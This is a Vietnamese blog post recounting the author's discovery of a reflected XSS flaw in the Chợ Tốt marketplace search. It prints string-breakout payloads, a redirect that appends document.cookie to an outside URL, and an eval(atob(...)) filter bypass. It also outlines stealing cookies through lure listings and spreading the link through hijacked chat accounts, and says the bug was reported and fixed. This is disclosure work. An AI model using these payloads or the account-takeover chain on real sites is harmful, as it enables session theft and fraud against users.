---
layout: post
title: Tôi đã hack Chợ Tốt như thế nào
thumbnail: hack-cho-tot.jpg
category: Chuyện lập trình
related_posts:
 - title: 
   link: http://laptrinhcuocsong.com/hoc-lam-hacker.html
 - title: 
   link: http://laptrinhcuocsong.com/tong-hop-nhung-kenh-youtube-ma-dan-cong-nghe-nen-theo-doi-phan-2.html
 - title: 
   link: http://laptrinhcuocsong.com/that-vong-su-tro-lai-cua-hiep-hoi-hacker-viet-nam-hva.html
---

Hôm nay thử dạo một vòng Chợ Tốt kiếm mấy món hàng cũ, thì phát hiện lỗi XSS, đây là lỗi không mới, cách thức tấn công cũng đơn giản, nhưng nhiều khi cần rất nhiều sáng tạo trong quá trình khai thác.

Thử tìm kiếm với từ khóa "iphone 7" thì thấy như thế này:

![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/mh0excozyx_c1.png)

Ai chà, url đẹp phết, mình thích url này rồi đấy, search key đã được bỏ dấu và thêm dấu gạch ngang cho hợp chuẩn. Thử thêm một ít html vào xem sao:

![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/xq1tymmaf1_c2.png)

Rất nhiều nơi, search key đã được entities, tuy nhiên vì lý do nào đó, search key trong đoạn javascript này đã không được xử lý.
Vấn đề là, từ khóa nó đang nằm trong string, nên alert không xảy ra hiện tượng gì. 

Cuối cùng mình sửa search key như sau:

```javascript
iphone 7" }; alert("something went wrong"); var a = { "a":"
```

Thì nhận được alert:

![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/sk8bcvtkaw_c3.png)

Bạn thấy không? Mình muốn nói đến cái search key trên, từ một property của object, nó đã tách thành 2 object, và alert nằm giữa một cách đẹp đẽ và tuyệt vời.

OK, giờ thử redrect đến 1 trang ngoài cùng với cookie của người dùng xem sao, mình thử code này:

```javascript
iphone 7" }; window.location="http://google.com/" + document.cookie; var a = { "a":"
```

![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/o7l9sidows_c4.png)

Cái lề gì thốn, coder đã cẩn thận bỏ dấu gạch chéo // và phần sau của search key đi, cũng như lọc một số từ đặc biệt trong chuỗi, như vậy là không thể tương tác gì url bên ngoài được? Không, phải nghĩ cách khác. Cuối cùng thì mình đã tìm ra cách hoàn hảo nhất là đây:

```javascript
iphone 7" }; eval(atob("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")); var a = { "a":"
```

Với xxxxx là mã hóa base64 của một đoạn code javascript bất kỳ, tức là chúng ta có thể chèn bất kỳ đoạn javascript nào vào Chợ Tốt. Ví dụ sau đây để alert cookie:

```javascript
iphone 7" }; eval(atob("YWxlcnQoIGRvY3VtZW50LmNvb2tpZSk=")); var a = { "a":"
```

Và đây là kết quả:

![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/t9g7rdgqhh_9.png)

Đã đến bước này, thì các bạn đã biết mình sẽ làm gì tiếp theo rồi phải không? Mình đăng 1 bài viết mua bán với giá rất rẻ, trong đó có kèm link, lấy cookie để vào được tài khoản của những người không may click vào link.

Nhưng không dừng lại ở đó, khi đã vào được tài khoản của vài thành viên khác, mình có thể mở rộng hơn qua chính công cụ chat của Chợ Tốt bằng tokenKey đã lấy được. Viết script tự động chat với nhiều thành viên khác với nội dung bán đồ rất rẻ, và kèm link để câu.

![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/j5w20u6nil_c6.png)

Tâm lý là khi được chat về sản phẩm đang bán, người dùng rất dễ click vào link, social engineering khá hiệu quả trong trường hợp này.

Hiện tại mình đã report, bên ChoTot đã xác nhận, fix lỗi xong và thông báo lại cho mình

![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/6uo1x836x9_chotot.png)

